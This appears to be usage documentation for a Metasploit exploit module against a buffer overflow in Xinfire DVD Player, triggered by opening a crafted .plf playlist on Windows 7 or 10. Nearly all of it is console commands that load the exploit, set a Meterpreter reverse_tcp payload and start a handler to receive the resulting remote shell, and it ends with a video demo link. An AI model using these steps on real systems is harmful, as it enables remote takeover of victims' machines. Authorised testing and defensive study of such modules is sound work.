Vulnerable Application
open plf file on (playlist), and the vulnerability is triggered.

Targets
Win 7 and Win 10

Verification

use exploit/windows/fileformat/xinfire_dvd_player
set payload windows/meterpreter/reverse_tcp
set lhost (IP of Local Host)
exploit

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost (IP of Local Host)
exploit

Video demo Buffer Overflow Xinfire DVD Player
https://youtu.be/IqTO7WNJO24
